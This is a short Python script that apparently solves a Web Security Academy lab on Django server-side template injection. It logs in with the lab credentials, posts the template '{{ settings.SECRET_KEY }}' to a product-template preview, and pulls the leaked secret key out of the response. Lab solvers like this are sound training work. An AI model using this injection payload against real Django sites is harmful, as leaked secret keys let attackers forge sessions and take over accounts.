from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup


def solve_lab(session):
    session.login("content-manager", "C0nt3ntM4n4g3r")

    # Explanation: By examining error messages, I determined that this lab uses
    # Django templates. I used the {% debug %} template to dump the current
    # context, which includes hidden developer-supplied objects. I noticed the
    # settings object, which referenced a Django settings object. This object
    # let me view the site's configuration values, including the secret key.

    template = "{{ settings.SECRET_KEY }}"
    data = {
        "csrf": session.get_csrf_token("/product/template?productId=1"),
        "template-action": "preview",
        "template": template,
    }
    resp = session.post_path("/product/template?productId=1", data=data)
    logger.info("Previewed a product description with the following template:")
    logger.info(template)

    soup = BeautifulSoup(resp.text, "html.parser")
    secret_key = soup.select_one("#preview-result").text.strip()
    logger.info(f"Extracted SECRET_KEY: {secret_key}")
    session.submit_solution(secret_key)
